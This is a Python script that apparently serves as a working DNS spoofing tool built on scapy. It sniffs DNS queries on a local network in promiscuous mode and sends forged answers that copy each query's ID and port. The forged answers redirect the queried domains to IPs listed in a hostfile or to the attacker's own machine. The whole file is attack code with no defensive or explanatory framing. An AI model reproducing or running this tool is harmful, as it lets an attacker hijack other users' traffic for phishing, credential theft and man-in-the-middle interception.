import os
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.dns import DNS, DNSRR

iface = os.listdir('/sys/class/net')[0]
conf.sniff_promisc = 1
sck = conf.L3socket()
domains = dict()
udp_dns = UDP(sport=53)/DNS(opcode=0, qr=1, aa=0, tc=0, z=0, ad=0, cd=0, rcode=0, nscount=0, ancount=1)
maliciousIPv4 = IP()/udp_dns # pre-instantiated dns packet over ipv4 ready to be used
maliciousIPv6 = IPv6()/udp_dns # pre-instantiated dns packet over ipv6 ready to be used
dnsrr = DNSRR(type=1, rclass=1, ttl=5)

def get_local_ip(): # function to get local ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

local_ip = get_local_ip()

def parse_input_args(args): # parse input arguments
    global iface
    hostfile = ""
    if "-i" in args:
        i = args.index("-i")
        if not (i + 1 >= len(args)):
            iface = args[i+1]
    if "-h" in args:
        i = args.index("-h")
        if not (i + 1 >= len(args)):
            hostfile = args[i+1]
    return iface, hostfile

def get_domains(hostfile): # extracts domains from hostfile and puts them in global dictionary
    try:
        file = open(hostfile, "r")
    except Exception as e:
        print("Cannot open file")
        print(e)
        exit(1)

    domain_list = [line.strip().split(",") for line in file]

    domain_dict = {}
    for domain in domain_list:
        domain_dict[domain[1]] = domain[0]
    file.close()
    return domain_dict

def poisoning(pck): # callback function that performs DNS poisoning
    ip = pck.getlayer("IP")
    if not ip: # checks if packet is over ipv4 or ipv6
        ip = pck.getlayer("IPv6")
        if not ip:
            return
        poisonous_packet = maliciousIPv6
    else:
        poisonous_packet = maliciousIPv4
    if not pck.haslayer("DNS"):
        return
    udp = pck.getlayer("UDP")
    dns = pck.getlayer("DNS")
    if not dns.qr: # checks if dns packet is a query
        if domains: # checks if a hostfile exists
            hijack_ip = domains.get(str(dns.qd.qname)[2:-2])
            if hijack_ip: # checks if the domain being queried is present in the hostfile
                dnsrr.rdata = hijack_ip
            else:
                return
        else:
            dnsrr.rdata = local_ip
        dnsrr.rrname = dns.qd.qname # sets several headers
        poisonous_packet.src = ip.dst
        poisonous_packet.dst = ip.src
        poisonous_packet.dport = udp.sport
        poisonous_packet[DNS].id = dns.id
        poisonous_packet[DNS].rd = dns.rd
        poisonous_packet.qdcount = dns.qdcount
        poisonous_packet.qd = dns.qd
        poisonous_packet.an = dnsrr
        sck.send(poisonous_packet) # sends the packet

def main():
    if os.getuid() != 0:
        print("I need root privileges to run")
        exit(1)

    global iface, domains, socket
    conf.iface, hostfile = parse_input_args(sys.argv[1:])

    if hostfile:
        domains = get_domains(hostfile)

    sniff(count=0, filter="udp port 53", monitor=True, prn=poisoning, iface=iface)

if __name__ == "__main__":
    main()
